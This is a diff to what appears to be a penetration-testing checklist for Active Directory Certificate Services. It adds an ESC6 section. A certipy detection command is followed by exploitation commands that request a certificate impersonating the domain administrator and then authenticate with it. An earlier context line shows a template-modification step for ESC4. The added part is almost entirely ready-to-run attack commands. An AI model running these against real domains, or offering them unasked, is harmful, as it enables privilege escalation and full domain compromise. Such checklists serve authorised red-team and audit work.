@@ -45,6 +45,18 @@
 *makes the template open to esc1 (don't forget -save-old!)*
 - [ ] `certipy template -u test@domain.local -p 'superpassword'  -template 'TEMPLATE_NAME' -save-old`
 ---
+## ESC6 
+
+** DETECT **
+
+- [ ] `certipy find -u 'test@domain.local' -p 'superpassword' -dc-ip <DC_IP> -vulnerable`
+
+** EXPLOITATION **
+
+- [ ] `certipy req -u'test@domain.local' -p 'superpassword' -target-ip <TARGET_IP> -ca 'CA_NAME' -template 'TEMPLATE_NAME' -upn 'administrator@domain.local'`
+- [ ] `certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'domain.local' -dc-ip <DC_IP>`
+
+---
 ## ESC7
 
 ** DETECT **
